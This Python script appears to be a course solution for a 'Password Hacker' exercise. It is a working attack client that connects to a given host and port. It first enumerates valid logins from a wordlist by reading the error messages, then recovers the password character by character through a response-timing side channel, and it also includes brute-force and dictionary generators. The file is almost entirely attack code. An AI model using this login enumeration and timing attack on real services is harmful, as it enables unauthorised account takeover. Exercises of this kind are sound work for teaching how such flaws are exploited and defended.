import socket
import string
import sys
import json
import logging
import time

from math import floor
from dataclasses import dataclass, asdict
from enum import Enum
from itertools import product, combinations
from typing import Iterable, Optional

args = sys.argv

# I run several tests to estimate the precision of the response time which are around than 10**-04
# With a precision of 3, I nullify normal response time and can detect anormal response time
#  I could check in test code to know that the delay is 0.1s but that could be unfair,
#  I could also detect some outlier but that could be overengineering for the exercise,
#  so the solution chosen is this empirical solution
PRECISION_DIGIT = 3
response_time = []

logging.basicConfig(
    filename="log.log",
    filemode="w",
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO,
)

LOCAL_PATH = r"Password Hacker with Python\task\hacking"


class NetworkError(Exception):
    pass


class NetworkMessage(Enum):
    WRONG_LOGIN = "Wrong login!"
    WRONG_PASSWORD = "Wrong password!"
    EXCEPTION_PASSWORD = "Exception happened during login"
    CORRECT_CONNECTION = "Connection success!"
    BAD_REQUEST = "Bad request!"
    ERROR_MESSAGE = "Too many attempts"


class GeneratorMethod(Enum):
    BruteForce = 'BruteForce'
    Dictionary = 'Dictionary'
    BruteForceByCharacters = 'BruteForceByCharacters'


@dataclass
class Credentials:
    login: str
    password: str


class PasswordGenerator:
    """
    Class responsible for creating iterator of passwords based on a specified method.
    """

    def __init__(self, max_length=8, filename="passwords.txt") -> None:
        self.max_length = max_length
        self.filename = filename

    def __generate_by_brute_force(self) -> Iterable[str]:
        choice = string.ascii_lowercase + string.digits
        for i in range(1, self.max_length + 1):
            for pwd in product(choice, repeat=i):
                yield ''.join(pwd)

    def __read_from_files(self) -> list[str]:
        try:
            with open(self.filename) as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"File '{self.filename}' not found.")
            return []

    def __create_case_variations(self, password) -> Iterable[str]:
        list_index = [i for i in range(len(password))]
        for i in range(len(password) + 1):
            for combi in combinations(list_index, i):
                new_password = list(password)
                for index in combi:
                    new_password[index] = new_password[index].upper()
                yield ''.join(new_password)

    def __generate_by_dictionary(self) -> Iterable[str]:
        list_password = self.__read_from_files()
        for password in list_password:
            yield from self.__create_case_variations(password)

    def __generate_by_characters(self, begin_pwd: str) -> Iterable[str]:
        char_list = string.ascii_lowercase + string.ascii_uppercase + string.digits
        for c in char_list:
            yield begin_pwd + c

    def generator(self, **kwargs) -> Iterable[str]:
        password_generator = None
        method = kwargs.get("method", GeneratorMethod.BruteForce)
        begin_char = kwargs.get("begin_char", "")
        match method:
            case GeneratorMethod.BruteForce:
                password_generator = self.__generate_by_brute_force
            case GeneratorMethod.Dictionary:
                password_generator = self.__generate_by_dictionary
            case GeneratorMethod.BruteForceByCharacters:
                password_generator = lambda : self.__generate_by_characters(begin_char)
        yield from password_generator()


def catch_result(data) -> NetworkMessage:
    response: dict = json.loads(data)
    try:
        message = response.get("result", None)
        if message is None:
            logging.error(f"result is not recognized : {response} ")
            raise NetworkError("Wrong response format.")
        logging.debug(f"Parsed message: '{message}'")
        network_message = NetworkMessage(message)
    except KeyError:
        raise NetworkError(f"Unknown message: '{response['result']}'.'")
    else:
        return network_message


def login_attack(socket) -> Optional[str]:
    """
    Try to discover login from login.txt file.
    Can raise FileNotFoundError, NetworkError.
    """
    logging.info("Starting login attack")
    list_login = []
    global response_time
    with open(r"logins.txt") as f:
        list_login = [line.strip() for line in f if line.strip()]
        logging.debug(f"List of logins: {list_login}")

    for login in list_login:
        logging.debug(f"Trying login: {login}")
        data = json.dumps(asdict(Credentials(login, "12345")))

        logging.debug(f"Sending data: {data}")
        start_time = time.time()
        socket.send(data.encode())
        response = socket.recv(1024)
        end_time = time.time()
        elapsed_time = floor((end_time - start_time)* 10**PRECISION_DIGIT)
        response_time.append(elapsed_time)

        response = response.decode()
        logging.debug(f"Response: {response} with response time: {elapsed_time}")
        network_message = catch_result(response)

        match network_message:
            # If I have a message about password, it means the login pass
            case NetworkMessage.WRONG_PASSWORD | NetworkMessage.EXCEPTION_PASSWORD:
                return login
            case NetworkMessage.BAD_REQUEST:
                logging.error(f"Bad request send {data}")
                return None
            case _:
                continue
    return None


def password_attack(socket, **kwargs) -> Optional[str]:
    login = kwargs.get("login", "admin")
    method = kwargs.get("method", GeneratorMethod.BruteForce)
    max_length = kwargs.get("max_length", 8)
    logging.info("Starting password attack")
    begin_char = ""
    while len(begin_char) < max_length:
        password_generator = PasswordGenerator().generator(method=method, begin_char=begin_char)
        char_not_found = True

        for password in password_generator:
            logging.debug(f"Trying password: {password}")
            data = json.dumps(asdict(Credentials(login, password)))

            start_time = time.time()
            socket.send(data.encode())
            response = socket.recv(1024)
            end_time = time.time()
            elapsed_time = floor((end_time - start_time)* 10**PRECISION_DIGIT)
            response_time.append(elapsed_time)
            response = response.decode()
            logging.debug(f"Response: {response} with response time: {elapsed_time}")

            network_message = catch_result(response)
            match network_message:
                case NetworkMessage.CORRECT_CONNECTION:
                    return password
                case NetworkMessage.WRONG_PASSWORD:
                    # with the precision, a normal request will have a response time of 0
                    # This check can catch false positive character so can lead to guess the wrong password
                    #  but after running some time, it captures finally the good password
                    if elapsed_time > 0:
                        logging.info(f"found next character : {password}")
                        begin_char = password
                        char_not_found = False
                        break
                    else:
                        continue
                case _ :
                    continue
        if char_not_found:
            logging.error(f"No new characters found for password '{begin_char}'")
            return None
    return None


if __name__ == "__main__":
    hostname, port = args[1], int(args[2])

    with socket.socket() as client_socket:
        address = (hostname, port)
        client_socket.connect(address)
        try:
            found_login = login_attack(client_socket)
            logging.info(f"Found login: {found_login}")
            password = password_attack(client_socket, login=found_login, method=GeneratorMethod.BruteForceByCharacters)
        except FileNotFoundError:
            logging.error("File 'login.txt' not found.")
            exit(1)
        except NetworkError:
            logging.error("Wrong response format.")
            exit(1)
        except Exception as e:
            logging.error(f"Unknown error: {e}")
        else:
            print(json.dumps(asdict(Credentials(found_login, password))))
